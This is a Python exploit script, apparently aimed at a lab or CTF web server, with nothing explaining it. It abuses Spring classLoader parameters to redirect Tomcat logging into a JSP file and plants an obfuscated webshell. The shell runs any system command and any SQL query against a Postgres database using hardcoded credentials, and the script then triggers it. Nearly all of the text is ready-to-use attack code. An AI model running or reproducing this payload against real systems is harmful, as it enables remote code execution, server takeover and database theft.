webshell_payload = "<% try { if (request.getParameter(new String(new char[]{99,109,100})) != null) { String cmd = request.getParameter(new String(new char[]{99,109,100})); out.println(new String(new char[]{60,104,51,62,67,111,109,109,97,110,100,32,69,120,101,99,117,116,105,111,110,58,32,60,47,104,51,62,60,112,114,101,32,115,116,121,108,101,61,39,98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114,58,35,51,51,51,59,99,111,108,111,114,58,35,102,102,102,59,112,97,100,100,105,110,103,58,49,48,112,120,59,39,62})); out.println(cmd); java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); int a = -1; byte[] b = new byte[4096]; while ((a = in.read(b)) != -1) { out.println(new String(b, 0, a)); } out.println(new String(new char[]{60,47,112,114,101,62})); } if (request.getParameter(new String(new char[]{113,117,101,114,121})) != null) { String sqlQuery = request.getParameter(new String(new char[]{113,117,101,114,121})); out.println(new String(new char[]{60,104,51,62,68,97,116,97,98,97,115,101,32,81,117,101,114,121,58,32,60,47,104,51,62,60,112,114,101,32,115,116,121,108,101,61,39,98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114,58,35,101,102,101,102,101,102,59,112,97,100,100,105,110,103,58,49,48,112,120,59,39,62})); out.println(sqlQuery); String dbUrl = new String(new char[]{106,100,98,99,58,112,111,115,116,103,114,101,115,113,108,58,47,47,100,98,45,115,101,114,118,101,114,58,53,52,51,50,47,119,104,95,97,105,114}); String dbUser = new String(new char[]{119,104,95,109,97,110,97,103,101,114}); String dbPass = new String(new char[]{112,97,115,115,119,111,114,100,33}); java.sql.Connection conn = null; java.sql.Statement stmt = null; java.sql.ResultSet rs = null; Class.forName(new String(new char[]{111,114,103,46,112,111,115,116,103,114,101,115,113,108,46,68,114,105,118,101,114})); conn = java.sql.DriverManager.getConnection(dbUrl, dbUser, dbPass); stmt = conn.createStatement(); if (stmt.execute(sqlQuery)) { rs = stmt.getResultSet(); while (rs.next()) { for (int i = 1; i <= rs.getMetaData().getColumnCount(); i++) { out.print(rs.getMetaData().getColumnName(i) + new String(new char[]{58,32}) + rs.getString(i) + new String(new char[]{32,124,32})); } out.println(); } } else { out.println(new String(new char[]{81,117,101,114,121,32,115,117,99,99,101,115,115,102,117,108,46})); } if (rs != null) rs.close(); if (stmt != null) stmt.close(); if (conn != null) conn.close(); out.println(new String(new char[]{60,47,112,114,101,62})); } } catch(Exception e) { out.println(e.toString()); } %>"

import requests
from urllib.parse import urlparse, urlencode
import time

BASEURL = "http://air.vulunch.kr"
TARGET_URL = "http://air.vulunch.kr/manager"
SHELL_FILENAME = "pwnshellpwn"

def exploit():
    global webshell_payload
    session = requests.Session()
    userData = {
        "name": "tafka4",
        "password": "tafka4tafka4!",
        "email": "tafka4@tafka4",
        "phoneNumber": "01012345678"
    }

    print(f"userData: {userData}")

    session.post(f"{BASEURL}/register", data=userData, headers={"Content-Type": "application/x-www-form-urlencoded"})

    session.post(f"{BASEURL}/login", data={"name": userData["name"], "password": userData["password"]}, headers={"Content-Type": "application/x-www-form-urlencoded"})

    cmd_param = "cmd"
    print(f"[*] Using fixed shell name: {SHELL_FILENAME}.jsp")
    print(f"[*] Using random command parameter: '{cmd_param}'")

    print("[*] Stage 1: Configuring server logging via GET parameters...")
    config_params = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{code}i",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": SHELL_FILENAME,
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }
    
    try:
        session.post(TARGET_URL, data=config_params, timeout=10, verify=False)
        print("[+] Configuration request sent successfully.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Stage 1 failed: {e}")
        return

    print("[*] Waiting 7 seconds for server to apply changes...")
    time.sleep(5)

    print("\n[*] Stage 2: Triggering webshell creation with minified payload...")

    print(f"[*] Using payload: {webshell_payload}")
    trigger_headers = {"code": webshell_payload}
    
    try:
        session.post(TARGET_URL, headers=trigger_headers, timeout=10, verify=False)
        print("[+] Trigger request sent successfully.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Stage 2 failed: {e}")
        return
    
    print("[*] Waiting 5 seconds for file to be written...")
    time.sleep(5)

    print("\n[*] Stage 3: Verifying webshell and executing command...")
    parsed_url = urlparse(TARGET_URL)
    shell_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{SHELL_FILENAME}.jsp"
    
    try:
        print(f"[*] Checking for shell at: {shell_url}")
        verify_response = session.get(shell_url, timeout=10, verify=False)
        
        if verify_response.status_code != 200:
            print(f"[-] Shell not found or access denied. Status: {verify_response.status_code}")
            print(f"[-] Response: {verify_response.text}")
            return
            
        print(f"[+] Webshell found! Executing command: '{cmd_param}'")
        
        exec_params = {cmd_param: cmd_param}
        cmd_response = session.get(shell_url, params=exec_params, timeout=15, verify=False)
        
        print("\n--- COMMAND OUTPUT ---")
        output = cmd_response.text.strip()
        print(output if output else "[!] Command executed but returned no output.")
        print("----------------------")

    except requests.exceptions.RequestException as e:
        print(f"[-] Stage 3 failed: {e}")

if __name__ == "__main__":
    while True:
        if exploit():
            break
        time.sleep(1)
